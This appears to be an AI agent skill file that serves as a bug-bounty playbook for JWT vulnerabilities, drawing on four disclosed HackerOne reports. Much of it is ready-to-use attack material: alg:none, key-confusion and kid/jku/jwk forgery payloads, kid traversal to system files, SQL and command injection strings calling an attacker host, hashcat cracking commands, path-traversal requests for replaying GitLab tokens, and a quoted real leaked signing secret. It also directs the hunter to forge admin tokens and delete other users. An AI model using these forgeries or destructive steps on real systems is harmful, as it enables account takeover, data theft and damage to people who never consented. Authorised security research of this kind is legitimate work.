---
name: hunt-jwt
description: "Powerful hunting skill for JWT / JSON Web Token vulnerabilities. Built from 10 assigned reports (4 read in full, 6 mined from TOP lists) spanning alg:none signature stripping, RS256→HS256 key confusion, kid/jku/jwk header injection, hardcoded client-side signing secrets, missing aud/signature verification, and JWT leakage via broken authorization. Use when the app authenticates with a JSON Web Token — an `eyJ...` Bearer token in the Authorization header, a cookie, a SSO redirect (`?jwt=`, `/access/jwt?jwt=`), or a login/token response. Critical when a forged or stolen token grants another user's data, cross-tenant access, or admin-only actions. This skill OWNS broad JWT hunting; hunt-jwt-crypto covers the deep cryptographic forgery subset, hunt-ato covers JWT as one ATO path, hunt-auth-bypass covers SSO/SAML/OIDC token trust, hunt-api-misconfig covers non-crypto JWT handling."
sources: hackerone_public, github
report_count: 10
full_reports_read: 4
---

# HUNT-JWT — Forgeable, Leakable, and Mis-trusted JSON Web Tokens

A JWT is `header.payload.signature`, each segment base64url-encoded and joined by
dots. The signature is the *only* thing binding the payload (your identity, role,
tenant, email) to the issuer's authority. This skill pays when you can **forge** a
token the verifier accepts, **steal** a token that was issued to someone else, or
**replay** a legitimate token in a context it was never intended for — and then
turn that into cross-identity data access or an admin action.

The mined corpus is small but high-signal. Four full reports establish the four
dominant real-world discovery paths:

1. **Broken authorization at token *issuance*** — an integration hands a valid
   JWT to a low-privilege user ([#1103582]).
2. **Signing secret exposed in client-side code** — a sourcemap leaks the HMAC
   secret, so anyone can mint a token for any identity ([#638635]).
3. **Internal service JWT exposed via path/normalization confusion** — a trusted
   proxy's upload token is reflected and replayed for unauthorized writes
   ([#1040786]).
4. **Claim/signature verification omitted** — a validly signed token for the
   wrong audience is accepted, or signature verification is skipped entirely
   ([#1889161], plus verified cases [#3489490], [#1210502]).

Never hand-encode base64 — use **jwt_tool**, **Burp JWT Editor**, or **PyJWT**
so tampering and signing are correct. The win is always **cross-identity data
access or a privileged action**, never merely a 200 on your own `/me` endpoint.

---

## Crown Jewel Targets

JWT findings pay highest where the token is the sole gate between an attacker and
someone else's data or an administrative capability. Prioritize, in order:

- **SSO / OIDC / SAML-bridge endpoints** — `/access/jwt?jwt=`, `/oauth/token`,
  `/.well-known/openid-configuration`, `/authorize`, `claim-app?jwt=`. These are
  the single richest surface in the corpus: two of four full reports ([#638635],
  [#1889161]) and both verified extra cases ([#3489490], [#1210502]) live here.
  SSO tokens are commonly trusted across services, so a forgery or audience
  confusion has outsized blast radius.

- **Any app that signs a JWT with a secret that had to reach the browser** —
  React/Vue/Angular bundles, source maps (`*.js.map`), public env vars
  (`REACT_APP_*`, `NEXT_PUBLIC_*`), mobile app binaries, desktop Electron
  asar files. If the signing key ships to the client, the scheme is broken by
  construction ([#638635]).

- **Integrations and plugin marketplaces** — Jira/Confluence/Slack/Zendesk/
  GitHub Apps install-and-claim flows. Look for a "claim", "connect", or
  "get-started" page that *generates* a bearer token; test whether a low-privilege
  or unauthenticated user can obtain it ([#1103582]).

- **Microservice / proxy architectures with internal JWTs** — GitLab Workhorse→
  Rails, gateways, API meshes, "workhorse"/"geo"/"secondary" headers. These mint
  service-to-service tokens that are implicitly trusted; path normalization or
  header injection can expose and replay them ([#1040786]).

- **Multi-tenant SaaS with tenant claims** — `org_id`, `tenant`, `account_id`,
  `workspace_id`, `customer_id`. A forge or claim swap that crosses tenants is
  an IDOR-with-signature and typically High/Critical.

- **Admin-only endpoints and destructive actions** — `/admin`, `/admin/delete`,
  `/api/v1/users`, export-all, billing. These are the objective; the forge is
  only the vehicle.

- **OIDC providers that serve multiple audiences** — Argo CD-style bugs appear
  when one issuer signs tokens for many services and a consumer forgets to
  check `aud` ([#1889161]).

Payouts are highest when the forged/stolen token yields: admin account takeover,
cross-tenant data read, or an unauthorized state-changing action (push, delete,
export). Medium payouts attend information disclosure of private project names
or support tickets ([#1103582], [#638635]).

---

## Attack Surface Signals

### Transport locations where a JWT appears

```
Authorization: Bearer eyJhbGciOi...
Cookie: token=eyJ...            Cookie: jwt=eyJ...
Cookie: session=eyJ...          Cookie: access_token=eyJ...
?token=eyJ...  ?jwt=eyJ...  ?access_token=eyJ...  ?id_token=eyJ...
/access/jwt?jwt=eyJ...          /apps/atlassian/claim-app?jwt=eyJ...
Set-Cookie: ...=eyJ...          {"token":"eyJ..."}  {"access_token":"eyJ..."}
https://<service>/.well-known/jwks.json   /jwks   /jwks.json
https://<service>/.well-known/openid-configuration
Gitlab-Workhorse-Api-Request: eyJ...   Geo-GL-Id: key-<n>
```

### Header patterns to classify the token (decode segment 1)

```
{"alg":"none","typ":"JWT"}            -> try alg:none stripping first
{"alg":"HS256","typ":"JWT"}           -> weak-secret crack, client-side secret leak
{"alg":"RS256","typ":"JWT"}           -> key confusion, jku/x5u/jwk header injection
{"alg":"ES256",...}                   -> ECDSA; still test alg:none + alg swapping
"kid": "..."                          -> file/SQL/command/SSRF injection sink
"jku": "https://..."  "x5u": "..."     -> verifier fetches key from URL (SSRF + forge)
"jwk": {"kty":"RSA",...}              -> embedded key; self-signed forge if trusted
"typ": "JWT"  "cty": "JWT"            -> nested JWT / confusion surface
```

### Payload claim patterns (decode segment 2)

```
sub / user_id / id        -> identity to swap
role / roles / isAdmin / admin / scope / permissions  -> privilege escalation
email / username / name   -> impersonation
org_id / tenant / account_id / workspace_id / customer_id -> cross-tenant IDOR
aud / azp                 -> audience confusion (must match consumer)
iss                       -> issuer confusion / trusted-issuer allowlist bypass
exp / nbf / iat           -> time-based; missing exp often accepted forever
jti                       -> replay / nonce; UUID v4 in SSO tokens ([#638635])
groups                    -> Argo CD-style: privileges granted from groups claim ([#1889161])
```

### JS / source-map patterns (client-side secret discovery)

```javascript
jwt.sign(payload, REACT_APP_ZENDESK_SECRET)     // [638635] exact pattern
const { REACT_APP_ZENDESK_SECRET } = process.env
window.location = `${ZENDESK_DOMAIN}/access/jwt?jwt=${zendeskToken}`
jwt.sign(..., process.env.NEXT_PUBLIC_JWT_SECRET)
import.meta.env.VITE_JWT_SECRET
localStorage.setItem('token', ...)
```

```
app.<hash>.js.map  -> fetch it; grep the `sourcesContent` for `SECRET`, `jwt.sign`,
                      `process.env`, base64-looking 32-64 char HMAC keys
```

### Endpoint / integration patterns

```
/plugins/servlet/ac/<vendor>/get-started...   (Jira marketplace claim page)
/apps/atlassian/claim-app?jwt=...             (JWT grant to link an account)
/terraform/state/<path-traversal>             (GitLab: token reflection surface)
/-/push_from_secondary/<id>/<repo>.git/...    (Geo replay surface)
/access/jwt?jwt=...                           (Zendesk JWT SSO consumer)
/api/v4/...  /api/v1/...  /graphql             (API authorization via token claims)
```

### Response / infra signals

```
A 200 response that reflects a `*.gitlab-workhorse-upload` / upload JWT field
An internal header (`X-Workhorse-*`, `Gitlab-Workhorse-Api-Request`, `Geo-GL-Id`)
Steps that say "install app", "claim integration", "link account", "SSO redirect"
Multiple programs/consumers sharing one OIDC issuer -> audience confusion likely
Unauthenticated / Basic-role user reaching an "admin configuration" page
```

---

## Discovery Patterns From 4 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **SSO and token-consumer redirect endpoints** — *What to look for:* any URL
   that accepts `?jwt=`, `?token=`, or `/access/jwt`, and any "Support"/"Login with
   SSO" button that triggers a tokenized redirect. Decode the token; check `alg`,
   `aud`, `iss`, `groups`, `exp`. This is the single highest-yield starting point:
   [#638635] (client-side Zendesk SSO), [#1889161] (Argo CD audience), and the
   verified [#3489490]/[#1210502] (missing signature verification / symmetric
   algorithm acceptance) all began here.

2. **JavaScript bundles and source maps** — *What to look for:* `*.js.map` beside
   minified files; grep `sourcesContent` for `jwt.sign`, `SECRET`, `process.env`,
   `REACT_APP_*`, and 32–64 char random strings. In [#638635] the reporter went
   straight to `app.e984c9df.js.map` and found
   `var REACT_APP_ZENDESK_SECRET = "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ";`
   — a trivially forgeable token scheme.

3. **Integration "claim" / install flows and their permission model** — *What to
   look for:* a marketplace app that generates a linking JWT; enumerate user roles
   (Basic/Trusted/Site admin) and test whether the low-privilege role can retrieve
   or replay the claim link. [#1103582] started by "testing the integration
   feature in the application" and found the JWT leaked to unauthorized Jira
   users.

4. **Internal gateway/proxy token surfaces** — *What to look for:* path-traversal
   or normalization oddities that cause an upload/state API to echo a service JWT
   into the response; headers named `*Workhorse*`, `*Api-Request`, `Geo-*`.
   [#1040786] began with "Bypass `Gitlab::Workhorse.verify_api_request!`" and the
   observation that the State API reads `request.body` to append it as a file.

5. **Login / token-issuance responses** — *What to look for:* `"token":"eyJ..."`
   in login/refresh responses and `Set-Cookie` JWTs. Decode, then run the full
   forgery matrix (alg:none, key confusion, weak secret) before any other recon.

6. **Public key discovery** — *What to look for:* `/.well-known/jwks.json`,
   `/jwks`, `public.pem`, embedded modulus in the JS bundle. Needed for RS256→HS256
   key confusion and for jku/x5u injection tests.

7. **Multi-tenant claim surfaces** — *What to look for:* tokens carrying tenant
   identifiers; test claim swaps once you have any forge primitive.

8. **Admin endpoints** — *What to look for:* map `/admin`, delete/export actions
   early so that once a forge works you can immediately drive to impact instead
   of drifting.

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Frequencies are the count of full reports in the study pack that carried each
technique tag (4 full reports total).

| Rank | Feature / Signal | Freq | Why it matters / What to probe |
|------|------------------|------|--------------------------------|
| 1 | `jwt-token` | 4 | Token is core to all findings. Decode `alg`, `aud`, `iss`, claims; run forgery matrix. |
| 2 | `admin-internal` | 3 | Privileged/internal context is the payoff. Probe role/admin claims and internal proxy tokens. |
| 3 | `sso-oauth` | 2 | Cross-service token trust. Probe the `?jwt=` redirect consumer, audience, signature checks. |
| 4 | `redirect-handling` | 2 | Token travels via redirect. Probe `window.location`/`Location` flows and claim links. |
| 5 | `api-endpoint` | 2 | API authorizes by token claims. Probe claim swaps against `/api/v4`, `/api/v1`, GraphQL. |
| 6 | `search-filter-sort` | 1 | Screens listing private data via a leaked token. Probe what a Basic user's JWT can list. |
| 7 | `js-source-review` | 1 | Direct secret exposure. Fetch `*.js.map`; grep for `jwt.sign` and `SECRET`. |
| 8 | `import-feature` | 1 | File/state import APIs reflect service JWTs. Probe path traversal on upload endpoints. |
| 9 | `export-feature` | 1 | Export endpoints reachable with a forged/leaked token. Probe data exfil impact. |
| 10 | `template-injection` | 1 | Token embedded in templates/redirects. Probe reflection of token into UI/HTML. |
| 11 | `file-upload` | 1 | Upload API enabled the Workhorse JWT leak. Probe multipart fields and path normalization. |
| 12 | `image-processing` | 1 | Same GitLab upload path; secondary surface. Probe file-name/path params. |
| 13 | `cookie-handling` | 1 | JWT transported in cookies. Probe session/known_signin cookies and signing. |
| 14 | `xml-parser` | 1 | Parser adjacent to token-bearing upload path. Probe for token reflection in parsed output. |
| 15 | `cache-layer` | 1 | Cached token-bearing responses. Probe whether a leaked JWT persists in caches/CDN. |
| 16 | `filter-bypass` | 1 | Path/authorization filter bypass exposed the token. Probe encoded traversal (`%2e%2e`). |
| 17 | `comment-injection` | 1 | Post-exploitation action with leaked token. Probe creating comments on private issues. |
| 18 | `session-attack` | 1 | Token replay/session confusion. Probe reuse of captured JWT across sessions. |

### Verbatim Discovery Clues

All lines below are verbatim excerpts from the disclosed report text in the study
pack. They are the researchers' own descriptions of what led them to the bug.

> [#1103582] "HackerOne provides an application tool HackerOne for Jira, an
> application that allows programs to track security issues through a jira
> instance. After testing the integration feature in the application, it was
> found that the application …"

> [#638635] "The JavaScript source map files are available next to the minified
> production files. This significantly makes analyzing this issue easier."
> — followed by `const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);`
> and `window.location = \`${ZENDESK_DOMAIN}/access/jwt?jwt=${zendeskToken}\`;`

> [#638635] "Searching for `REACT_APP_ZENDESK_SECRET` in the sourcemap will show
> the JWT secret" — `var REACT_APP_ZENDESK_SECRET =
> "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ";`

> [#1040786] "Bypass `Gitlab::Workhorse.verify_api_request!` — This was due to
> the fact that Workhorse clean the URL before passing it to Rails … and State
> Api read `request.body` to append it as a file!"

> [#1040786] "POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1"
> — "You will then receive something like this which the JWT is in
> `mirror.gitlab-workhorse-upload` parameter"

> [#1889161] "OIDC providers include an aud (audience) claim in signed tokens.
> The value of that claim specifies the intended audience(s) of the token …
> Argo CD does validate that the token was signed by Argo CD's configured OIDC
> provider. But Argo CD does not validate the audience claim, so it will accept
> tokens that are not intended for Argo CD."

> [#1889161] "If Argo CD's configured OIDC provider also serves other audiences
> (for example, a file storage service), then Argo CD will accept a token intended
> for one of those other audiences. Argo CD will grant the user privileges based
> on the token's groups claim, even though those groups were not intended to …"

> [#1103582] "it is found that the [HackerOne for Jira] application does not
> verify the user's permissions and generates the JWT code for a user with basic
> privileges. This allows this malicious user to link their hackerone account to
> an instance of a jira that they do not own."

### Probe Checklist (15 concrete probes)

1. **Decode the first segment** of every `eyJ...` token; record `alg`, `kid`,
   `jku`, `jwk`, `x5u` before any other test.
2. **Run `alg:none`** immediately (free): set `{"alg":"none"}`, drop signature,
   keep trailing dot; try `None`/`NONE`/`nOnE` case variants.
3. **Try RS256→HS256 key confusion** using the public key from `/jwks.json` as
   the HMAC secret (`jwt_tool <token> -X k -pk public.pem`).
4. **Fetch every `*.js.map`** and grep `sourcesContent` for `jwt.sign`, `SECRET`,
   `process.env`, `REACT_APP_*` ([#638635] pattern).
5. **Crack weak HS256 secrets** offline (`hashcat -a 0 -m 16500`, `jwt_tool -C`).
6. **Test `kid` injection** — `../../../../dev/null` for empty-secret HMAC, plus
   SQLi/`$(cmd)`/URL payloads if the lookup hits DB/shell/URL.
7. **Test `jku`/`x5u`** by hosting your own JWKS and signing with your private
   key; if host-allowlisted, chain an open redirect on the target's domain.
8. **Test embedded `jwk`** self-sign: embed your public key in the header and
   sign with your private key.
9. **Strip/alter time claims** — remove `exp`, or set `nbf` past and `exp` to
   `4102444800` (2099).
10. **Swap identity/role/tenant claims** — `sub`, `role`, `isAdmin`, `org_id`,
    `email` — matching a real token's shape.
11. **Probe `aud` enforcement** — present a validly signed token for a different
    audience and see if it is accepted ([#1889161]).
12. **Test issuance authorization** — as a Basic/low-privilege user, request the
    integration "claim" page and capture the generated JWT ([#1103582]).
13. **Probe path normalization** on upload/state APIs — `%2e%2e%2f` tricks that
    make a proxy echo an internal service JWT into the response ([#1040786]).
14. **Replay captured tokens across sessions/services** — logout, re-login as a
    different user, or send the token to a sibling service that shares the issuer.
15. **Drive any accepted forge straight to `/admin`** and perform an admin action
    with the same token; confirm foreign-user data in the response.

---

## Step-by-Step Hunting Methodology

1. **Establish that the target is JWT-based.** Look for `eyJ...` in
   Authorization headers, cookies, login JSON, and SSO redirects. If you only
   see opaque cookies, decode them anyway — many are base64 JWTs.

2. **Capture a genuine token** from a normal login/SSO flow. Decode header and
   payload with jwt_tool or jwt.io. Record every claim name and the exact `alg`.

3. **Classify the token and pick the attack family.**
   - `alg:none` — always try first, it is free.
   - HS256 with exposed/weak secret — client-side secret leak or crack.
   - RS256 — key confusion, jku/x5u/jwk injection, or audience/issuer confusion.
   - Any — claim manipulation, time-claim stripping, cross-tenant swaps.

4. **Look for the secret or public key.** Fetch JS bundles and source maps; grep
   for `jwt.sign`, `SECRET`, `process.env`, 32–64 char strings. Check
   `/.well-known/jwks.json`, `/jwks`, and embedded modulus. This step decides
   whether HS-crack or RS-key-confusion is viable.

5. **Run the automated matrix early.**
   ```bash
   jwt_tool <token> -X a                       # alg:none
   jwt_tool <token> -X k -pk public.pem        # key confusion
   jwt_tool <token> -C -d wordlist.txt         # weak-secret crack
   nuclei -u https://target -t jwt/ -timeout 10s
   ```
   Automation often finds the bug faster than manual chaining; do it before deep
   manual work, then verify every positive by hand.

6. **Forge a minimal tampered token and test acceptance against a protected but
   non-destructive endpoint** (e.g. `/me`, `/api/v1/userinfo`). A 200 with edited
   claims proves the forge mechanism. Do not stop here — this is only step 6 of
   the chain.

7. **Drive to the ADMIN / cross-identity objective.** Fixed escalation sequence
   (do not loop on earlier steps):
   1. Forge an admin identity and hit `/admin` (try claim names matching the real
      token: `sub`, `role`, `isAdmin`, `username`, e.g. `{"sub":"administrator"}`
      with `kid` → `/dev/null` and empty secret for HS256).
   2. When `/admin` returns 200 with admin controls/delete link, perform the admin
      action with the SAME token — e.g. `GET /admin/delete?username=<victim>`
      (read the page for the exact verb/form).
   3. A 401 on `/admin` means the forge/claim is wrong — change ONE thing (kid
      depth, claim name/value, or alg) and retry `/admin`. Never retreat to a
      bare unauthenticated `GET /admin`; it always 401s and wastes effort.

8. **Prove cross-identity data access.** The win is reading data you should not:
   an account/user listing with multiple users' emails, another user's object, or
   a completed admin action (deleted-user confirmation). A 200 returning only
   your own data, or a 401, is not proof.

9. **Test the issuance/authorization angle separately.** Even without a forge, a
   token handed to the wrong user is a bug: enumerate roles and fetch the
   integration claim/JWT issuance page as each role ([#1103582]).

10. **Test the verification-omission angle.** Present a validly signed token for
    a different `aud`, from a different `iss`, or with no signature at all
    ([#1889161], [#3489490], [#1210502]).

11. **Explore internal-token surfaces.** Look for proxy/gateway headers and
    path-normalization bugs that reflect service JWTs ([#1040786]); replay those
    tokens against the internal capability they guard.

12. **Document the full chain** with decoded headers/payloads, the exact forge
    command, and the protected endpoint response showing foreign data.

---

## Payload & Detection Patterns

### Decode & recon (never hand-encode base64)

```bash
# jwt_tool decode/inspect
jwt_tool <token>
# Interactive tampering menu
jwt_tool <token> -T
# Pure python decode of the three segments
python3 - <<'PY'
import base64, json
t = "<token>"
for seg in t.split('.')[:2]:
    print(json.loads(base64.urlsafe_b64decode(seg + '=' * (-len(seg) % 4))))
PY
```

### alg:none — become admin / another user

```
header:    {"alg":"none","typ":"JWT"}
payload:   {"data":{"id":1,"email":"admin@target.example","role":"admin"}}
signature: (empty — keep the trailing dot:  header.payload. )
```
```
jwt_tool <token> -X a
# Case variants when lowercase is rejected: None / NONE / nOnE
```

### RS256 → HS256 key confusion — once you have the RSA public key

```
1. Obtain the server's RSA public key as PEM: /jwks.json,
   /.well-known/jwks.json (convert JWK→PEM), a public-key file in the JS bundle,
   or recover it from two captured tokens (jwt_tool / rsa_sign2n).
2. Re-sign an EDITED payload with HS256 using that PEM as the HMAC secret:
     jwt_tool <token> -X k -pk public.pem
   payload edit: {"sub":"administrator"}  (or role:"admin" / another user's id)
```

### kid header injection — verifier loads the HMAC key from a file named by `kid`

```
header:  {"alg":"HS256","kid":"../../../../../../../dev/null"}
secret:  ""     (contents of /dev/null = empty string → sign HS256 with empty secret)
payload: {"sub":"administrator"}
```
`kid` can also carry SQLi / command injection / SSRF if the key lookup hits a DB /
shell / URL — `kid` is attacker-controlled and reaches a dangerous sink.

### jku / x5u header injection (RS256) — verifier fetches the key from a URL

```
1. Host a JWKS containing a public key you control, reachable by the verifier.
2. Set the token's `jku` (or `x5u`) header to that URL; sign the edited payload
   with YOUR matching private key.
3. If jku hosts are allowlisted, chain an open redirect / SSRF-reachable path on
   the target's OWN domain so the fetch resolves to your JWKS.
```

### jwk header self-signed key injection (RS256)

```
header:  {"alg":"RS256","jwk":{"kty":"RSA","n":"<your_rsa_modulus>","e":"AQAB"}}
payload: {"sub":"administrator"}
signature: (sign with your matching private key)
```
Works when the verifier trusts a `jwk` claim in the header without checking
provenance or allowlisting keys.

### Time-based claim manipulation

```
Remove "exp" entirely — many validators skip the check if absent.
Or: {"sub":"administrator","nbf":1000000000,"exp":4102444800}  (year 2099)
```
Combine with any forge primitive above to bypass time-based validation.

### Cross-tenant claim injection

```
Identify tenant claims in a real token: "org_id","tenant","account_id",
"workspace_id","customer_id". Edit to another tenant's value:
{"sub":"victim@org.com","org_id":1234} -> {"sub":"victim@org.com","org_id":9999}
```
Systematic IDOR via claims — works when authorization trusts token claims without
server-side ownership checks; especially strong combined with alg:none/weak secret.

### Offline weak-HMAC-secret cracking

```bash
hashcat -a 0 -m 16500 <jwt_file> rockyou.txt   # mode 16500 = JWT
jwt_tool <token> -C -d wordlist.txt
# Once cracked, forge any token: jwt_tool <token> -S -s <secret>
```

### Automated suites

```bash
jwt_tool <token> -X a                        # alg:none
jwt_tool <token> -X k -pk public.pem         # key confusion
nuclei -u https://target -t jwt/ -timeout 10s
```

### Secret-leak source grep

```bash
# In a downloaded JS bundle / sourcemap
grep -aoE 'jwt\.sign\([^)]*\)|REACT_APP_[A-Z_]*SECRET|NEXT_PUBLIC_[A-Z_]*|[A-Za-z0-9]{32,}' app.js.map
# Reported real secret pattern ([#638635]):
# const { REACT_APP_ZENDESK_SECRET } = process.env;
# var REACT_APP_ZENDESK_SECRET = "oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ";
```

### SSO claim-link / issuance probe ([#1103582] pattern)

```
1. As Basic/low-privilege user, GET
   /plugins/servlet/ac/<vendor>/get-started-with-<vendor>-on-jira
2. Capture the generated link:  https://target/apps/<vendor>/claim-app?jwt=<TOKEN>
3. Replay that token to link an instance you do not own; confirm access to
   private projects / issue creation.
```

### Internal proxy JWT exposure probe ([#1040786] pattern)

```
POST /api/v4/projects/<id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis/attachments?serial=1
  -> response field `mirror.gitlab-workhorse-upload`: eyJ...
Then replay as:
POST /-/push_from_secondary/2/<repo>.git/git-upload-pack.t%2f%2e%2e%2fgit-receive-pack
  Gitlab-Workhorse-Api-Request: <captured JWT>
  Geo-GL-Id: key-<id>        # incremental; brute-forceable
```

### Verifier-code grep patterns (source review)

```bash
grep -rniE "jwt\.verify|jsonwebtoken|PyJWT|decode\(" src/
grep -rniE "algorithms\s*=|verify\s*[:=]\s*(false|true)|ignoreExpiration" src/
grep -rniE "audience|issuer" src/            # missing aud/iss check -> [#1889161]
grep -rniE "kid|jku|jwk|x5u" src/            # header-driven key lookup sinks
grep -rniE "process\.env\.[A-Z_]*(SECRET|KEY)|REACT_APP_.*SECRET" src/
```

---

## Common Root Causes

1. **"The user said it was safe" — trust in token claims.** Developers treat
   JWT claims (`role`, `sub`, `org_id`) as authoritative and skip server-side
   ownership checks. Any forge or claim swap becomes an IDOR/privilege escalation.

2. **Verifier trusts the token's own `alg` header.** Accepting `alg:none` or
   allowing RS256→HS256 confusion means the attacker chooses the verification
   algorithm and key. This is the generic crypto root cause behind the classic
   forgeries.

3. **Signing secret shipped to the client.** A secret in JS/sourcemap/mobile
   binary is not a secret ([#638635]). Client-side JWT generation for SSO is
   broken by design.

4. **Missing claim verification.** Valid signature but no `aud`/`iss` check:
   a token minted for another service/consumer is accepted with its `groups`
   privileges intact ([#1889161]). Related: no signature verification at all
   ([#3489490]) or symmetric algorithms accepted with public keys ([#1210502]).

5. **Missing authorization at token issuance.** The integration generates a
   linking JWT without checking the requesting user's role ([#1103582]); the
   token itself is valid, just issued to the wrong principal.

6. **Path/normalization confusion exposing internal tokens.** A trusted proxy
   normalizes a URL before passing it to the app; the app reflects a service JWT
   into a response or file, which is then replayed ([#1040786]).

7. **Header-driven key lookup without validation.** `kid`/`jku`/`jwk`/`x5u`
   reach a file, DB, shell, or URL sink; attacker controls the key source.

8. **No expiry enforcement.** Missing `exp`, or `iat`/`nbf` not validated, makes
   stolen tokens valid forever.

9. **Weak/reused HMAC secrets.** Crackable offline via hashcat mode 16500.

10. **Replay-friendly design.** No `jti` nonce/single-use enforcement means a
    captured SSO token can be replayed across sessions or services.

---

## Bypass Techniques

### Algorithm confusion

```
alg:none case variants:   none / None / NONE / nOnE
Duplicate alg keys:       {"alg":"none","alg":"HS256"}  (parser differential)
RS256 -> HS256:           sign with the RSA public key string as HMAC secret
HS256 -> RS256:           if verifier expects asymmetric, test embedded jwk
```

### kid bypasses

```
../../../../../../../dev/null       -> empty secret (key = "")
../../../../../../../proc/self/environ  -> key from process env
../../../../../../../etc/passwd     -> key from known file content (predictable)
<SQLi>  e.g.  x' UNION SELECT 'attacker-secret'--    if key stored in DB
$(curl http://attacker/x)  ; command injection if shelled out
http://attacker/key        ; SSRF if verifier fetches kid as URL
```

### jku / x5u / jwk bypasses

```
jku host allowlist -> chain open redirect on the allowlisted domain:
   jku = https://target.example/redirect?to=https://attacker/jwks.json
jku + SSRF-reachable path on target's own domain
jwk self-sign: embed your RSA public key in header, sign with your private key
Multiple jwk/jku keys -> verifier may pick the attacker-controlled one first
```

### Claim/time bypasses

```
Remove exp entirely            -> many validators skip absent-exp checks
nbf in the past, exp year 2099 -> satisfy time windows
Swap sub/role/isAdmin/org_id   -> impersonate admin / other tenant
Add groups claim               -> Argo CD-style privilege grant ([#1889161])
aud array with multiple values -> include a value the consumer accepts
```

### Issuance / authorization bypasses ([#1103582])

```
Enumerate roles (Basic/Trusted/Site admin) and fetch the claim/JWT page as each.
Replay a captured claim link on an instance the low-priv user does not own.
Steal an admin-generated claim link, reuse it before it is consumed.
```

### Path / normalization bypasses ([#1040786])

```
%2e%2e%2f   encoded dot-dot-slash on state/upload API paths
%2f%2e%2e%2f  in git-receive-pack path -> route confusion
Trusted-proxy vs origin normalization mismatch -> token reflected in response
Geo-GL-Id: key-<incremental-id> -> brute-forceable identity header
```

### Validation-gate bypasses when a forge is rejected

```
alg:none rejected (401) -> try key confusion before concluding "safe"
Wrong claim name        -> decode a real token and match its exact claim names
kid depth wrong         -> adjust traversal depth one level at a time
401 on /admin           -> change ONE thing and retry /admin; never go tokenless
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you present a forged/stolen token and read data belonging to another
     identity or tenant? Show the foreign user's data (emails, objects, records)
     in the response.
   - Can you perform a privileged action (admin delete, unauthorized push, issue
     creation on a private project)? Show the completed action confirmation.
   - "The token was accepted" alone is insufficient — show *whose* identity/role
     was granted and *what* became accessible.

2. **What does the victim LOSE?**
   - Admin account takeover → full application control.
   - Cross-tenant data access → other customers' data (High/Critical).
   - Support-ticket / private-project disclosure → confidentiality loss
     ([#638635], [#1103582]).
   - Unauthorized write/push → integrity loss ([#1040786]).
   - If the answer is only "I made a token with alg:none," severity is low —
     quantify the reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint / claim page still live?
   - Does the forge command reproduce a token the verifier accepts reliably?
   - Can a second person decode your token, re-forge it, and hit the same
     protected endpoint without prior knowledge?
   - If reproduction needs a leaked secret that was rotated, a flaky proxy path,
     or a timing window — resolve the flakiness before submitting.

**Anti-drift reminder:** a forge that only loads your own `/my-account` is not a
finding. Do not keep re-forging `/my-account` or re-logging-in. Escalate to admin
and show the admin endpoint/action. A 200 that returns only your own data, or a
401, is not proof. Always decode and confirm the token you *sent* actually carries
the edited claims.

---

## Real Impact Examples

### Scenario A: Client-side secret → forge any Zendesk identity ([#638635] pattern)
The app implemented JWT SSO to Zendesk by signing tokens in the browser with a
hardcoded HMAC secret exposed in `app.js.map`. Any attacker could decode a legitimate
token, change `email` to a victim's address, refresh `iat`/`jti`, re-sign with the
leaked secret `oq1HJ4jXo99Wt41bwvLh9BXBVdgpi52CjkXbThow7UhWQGtJ`, and call
`https://trintsupport.zendesk.com/access/jwt?jwt=<forged>` to be logged in as the
victim. Impact: access to any customer's support ticket history (High, CVSS 8.1).
The fix is to generate the SSO JWT server-side so the secret never reaches clients.

### Scenario B: Audience confusion → cross-service privilege grant ([#1889161] pattern)
Argo CD validated that an OIDC token was signed by its configured provider but
never checked the `aud` claim. If that issuer also served a file-storage service,
a token intended for the other service — carrying its `groups` claim — was
accepted by Argo CD, granting privileges based on groups never meant for it. A
stolen low-value token for one audience became a key to a different system
(CVE-2023-22482, Critical). The fix is to validate `aud` (and `iss`) against the
expected consumer on every request.

### Scenario C: Broken issuance authorization → leak a linking JWT ([#1103582] pattern)
The HackerOne-for-Jira integration generated a `claim-app?jwt=<TOKEN>` link that
completed account linking. The app failed to verify the requesting Jira user's
role, so a Basic-privilege user could obtain the JWT and link a Jira instance they
did not own. Impact: reading private project names, creating issues in private
projects, injecting comments on private issues, and blocking the real admin from
linking the instance (Medium, CVSS 4.8, $3,000). The token was valid — the bug was
issuing it to the wrong principal.

### Scenario D: Proxy path confusion → internal service JWT replay ([#1040786] pattern)
A path-traversal on GitLab's Terraform State API made the Workhorse/Rails boundary
disagree about the URL, causing an internal upload JWT (`mirror.gitlab-workhorse-upload`,
`iss: gitlab-workhorse`) to be reflected in the response. That token was then
replayed in a `Gitlab-Workhorse-Api-Request` header, combined with a brute-forceable
`Geo-GL-Id: key-<n>` identity header, to push to repositories the attacker had no
write access to (High). Impact: unauthorized code write to readable projects.

---

## Disclosed Report Citations

All IDs below are real and verified against the master catalog and/or TOPAUTH.md.
Every report available in the study pack (4) is cited; two additional verified
JWT cases are included because they directly evidence the missing-signature /
symmetric-algorithm forgeries described above. No IDs or URLs are invented.

1. **HackerOne — HackerOne Jira integration plugin Leaked JWT to unauthorized jira users** ([H1 #1103582](https://hackerone.com/reports/1103582)) — JWT leakage to unauthorized users via missing role check at token issuance, 2021/$3,000.

2. **Trint Ltd — Insecure Zendesk SSO implementation by generating JWT client-side** ([H1 #638635](https://hackerone.com/reports/638635)) — hardcoded HMAC secret in client-side JS/sourcemap enabling arbitrary token forging and support-ticket impersonation, 2019/no bounty.

3. **GitLab — Exposure of a valid Gitlab-Workhorse JWT leading to various bad things** ([H1 #1040786](https://hackerone.com/reports/1040786)) — internal service JWT exposure via path/normalization confusion replayed for unauthorized git push, 2020/no bounty.

4. **ibb (Argo CD) — JWT audience claim is not verified** ([H1 #1889161](https://hackerone.com/reports/1889161)) — missing `aud` validation (CVE-2023-22482) allowing cross-audience token replay and groups-based privilege grant, 2023/no bounty.

